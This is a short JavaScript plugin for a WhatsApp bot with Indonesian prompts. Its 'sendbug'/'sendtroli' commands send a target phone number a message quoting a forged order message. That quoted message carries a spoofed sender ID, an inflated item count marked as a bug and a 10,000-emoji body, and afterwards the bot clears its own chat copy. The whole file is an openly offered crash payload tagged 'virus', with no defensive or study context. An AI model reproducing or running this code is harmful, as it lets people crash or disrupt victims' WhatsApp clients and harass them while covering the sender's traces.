// By Caliph
let handler = async (m, { conn, text, args, usedPrefix, command }) => {
if (!text) throw `Format Salah!!\nContoh : ${usedPrefix + command} +62 857-9490-8894`
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Hai Kak', 'conversation', {
 quoted: {
  key: {
  remoteJid: 'status@broadcast',
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: '🔥'.repeat(10000),
    orderTitle: 'MAMPUS', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
}).then(v => conn.modifyChat(v.key.remoteJid, 'clear'))
}
handler.help = ['sendbug <nomor>', 'sendtroli <nomor>']
handler.tags = ['host','virus']
handler.command = /^(sendtroli|sendbug)$/i
handler.owner = true 

module.exports = handler